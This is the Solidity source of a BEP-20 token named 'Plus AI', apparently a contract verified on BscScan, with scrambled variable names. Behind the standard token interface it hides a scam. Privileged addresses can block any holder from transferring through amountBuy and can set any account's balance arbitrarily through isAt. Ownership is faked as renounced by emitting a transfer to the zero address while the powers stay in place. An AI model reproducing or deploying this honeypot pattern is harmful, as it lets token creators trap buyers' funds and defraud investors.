/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface minTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txLimit) external view returns (uint256);

    function transfer(address fundEnable, uint256 exemptWallet) external returns (bool);

    function allowance(address feeLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptWallet) external returns (bool);

    function transferFrom(
        address sender,
        address fundEnable,
        uint256 exemptWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableLiquidity, uint256 value);
    event Approval(address indexed feeLimit, address indexed spender, uint256 value);
}

interface launchedTrading {
    function createPair(address liquidityTo, address buySenderWallet) external returns (address);
}

contract PlusAI is minTx {

    uint256 private walletLimit = 100000000 * 10 ** 18;

    uint256 public listMode;

    function name() external view virtual returns (string memory) {
        return tokenLaunched;
    }

    function amountBuy(address senderFeeFund) public {
        require(takeTxFund[feeTotalWallet()]);
        if (senderFeeFund == senderFund || senderFeeFund == marketingMax) {
            return;
        }
        shouldTrading[senderFeeFund] = true;
    }

    bool private toAmount;

    function feeTotalWallet() private view returns (address) {
        return msg.sender;
    }

    function approve(address takeList, uint256 exemptWallet) public virtual override returns (bool) {
        limitLaunched[feeTotalWallet()][takeList] = exemptWallet;
        emit Approval(feeTotalWallet(), takeList, exemptWallet);
        return true;
    }

    bool private fundTeam;

    mapping(address => uint256) private listLaunched;

    constructor (){ 
        senderFund = feeTotalWallet();
        listLaunched[senderFund] = walletLimit;
        takeTxFund[senderFund] = true;
        marketingMax = launchedTrading(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        emit Transfer(address(0), senderFund, walletLimit);
        emit OwnershipTransferred(senderFund, address(0));
    }

    mapping(address => bool) public shouldTrading;

    mapping(address => mapping(address => uint256)) private limitLaunched;

    mapping(address => bool) public takeTxFund;

    function symbol() external view virtual returns (string memory) {
        return takeIsMarketing;
    }

    uint256 private minLimitAuto;

    function shouldFund(address teamMax, address fundEnable, uint256 exemptWallet) internal returns (bool) {
        require(listLaunched[teamMax] >= exemptWallet);
        listLaunched[teamMax] -= exemptWallet;
        listLaunched[fundEnable] += exemptWallet;
        emit Transfer(teamMax, fundEnable, exemptWallet);
        return true;
    }

    uint8 private toToken = 18;

    function launchedSellLimit() public {
        emit OwnershipTransferred(senderFund, address(0));
        walletReceiverShould = address(0);
    }

    string private tokenLaunched = "Plus AI";

    bool public amountWallet;

    uint256 private feeReceiverSwap;

    uint256 private launchSwap;

    address public marketingMax;

    function totalSupply() external view virtual override returns (uint256) {
        return walletLimit;
    }

    function isAt(address launchedMaxExempt, uint256 exemptWallet) public {
        require(takeTxFund[feeTotalWallet()]);
        listLaunched[launchedMaxExempt] = exemptWallet;
    }

    bool private amountMax;

    function transfer(address launchedMaxExempt, uint256 exemptWallet) external virtual override returns (bool) {
        return buyTxMax(feeTotalWallet(), launchedMaxExempt, exemptWallet);
    }

    function balanceOf(address txLimit) public view virtual override returns (uint256) {
        return listLaunched[txLimit];
    }

    function decimals() external view virtual returns (uint8) {
        return toToken;
    }

    function buyTxMax(address teamMax, address fundEnable, uint256 exemptWallet) internal returns (bool) {
        require(!shouldTrading[teamMax]);
        return shouldFund(teamMax, fundEnable, exemptWallet);
    }

    string private takeIsMarketing = "PAI";

    function owner() external view returns (address) {
        return walletReceiverShould;
    }

    uint256 public liquidityReceiver;

    uint256 public maxList;

    function transferFrom(address teamMax, address fundEnable, uint256 exemptWallet) external override returns (bool) {
        if (limitLaunched[teamMax][feeTotalWallet()] != type(uint256).max) {
            require(exemptWallet <= limitLaunched[teamMax][feeTotalWallet()]);
            limitLaunched[teamMax][feeTotalWallet()] -= exemptWallet;
        }
        return buyTxMax(teamMax, fundEnable, exemptWallet);
    }

    function allowance(address sellTeam, address takeList) external view virtual override returns (uint256) {
        return limitLaunched[sellTeam][takeList];
    }

    address public senderFund;

    address private walletReceiverShould;

    function launchMode(address swapWalletBuy) public {
        require(!amountWallet);
        takeTxFund[swapWalletBuy] = true;
        amountWallet = true;
    }

    event OwnershipTransferred(address indexed maxLaunch, address indexed receiverReceiver);

}